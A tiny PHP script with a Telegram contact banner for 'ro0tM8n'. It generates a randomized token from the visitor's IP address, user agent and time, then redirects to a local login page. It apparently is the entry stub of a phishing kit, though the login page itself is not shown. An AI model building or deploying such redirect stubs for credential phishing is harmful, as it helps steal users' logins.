<?php 
/*
 _________________________________________________
| 						  						  |
|    CONTACT ME NOW : https://t.me/ro0tM8n        |
|                                                 |
| Official Channel : https://t.me/ro0tM8nchannel  |
|_________________________________________________|

*/

$xxx = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
header("Location: ./home/login.php?$xxx");
?>